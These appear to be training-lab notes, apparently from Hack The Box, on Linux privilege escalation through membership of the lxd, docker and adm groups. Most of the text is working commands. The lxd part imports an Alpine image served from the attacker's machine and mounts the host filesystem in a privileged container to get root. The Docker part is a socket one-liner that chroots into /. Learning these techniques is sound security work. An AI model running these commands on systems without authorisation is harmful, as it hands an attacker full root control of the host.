## LXC / LXD

Linux Containers (LXC) is an OS-level virtualisation technology that allows multiple isolated Linux environments to run on a single host while sharing the same kernel.

The user we are logged in as needs to be in the `lxd` group:

```bash
id
uid=1000(htb-student) gid=1000(htb-student) groups=1000(htb-student),116(lxd)
```
#### Priv Esc:

From Attacking system:

```bash
sudo git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder/
ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md

sudo python3 -m http.server 80
```

On Target:

```bash
wget http://10.10.15.35/alpine-v3.13-x86_64-20210218_0139.tar.gz
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
cd /mnt/root/root/
```
## Docker

Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources.

```bash
id
uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student),118(docker)
```

View images:

```bash
docker image ls
REPOSITORY   TAG       IMAGE ID       CREATED         SIZE
ubuntu       latest    5a81c4b8502e   19 months ago   77.8MB
```
#### Docker Socket

A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

There are a number of other ways to priv esc to root.
## ADM

This group can read logs in the `/var/log` directory

```bash
secaudit@NIX02:~$ id
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```



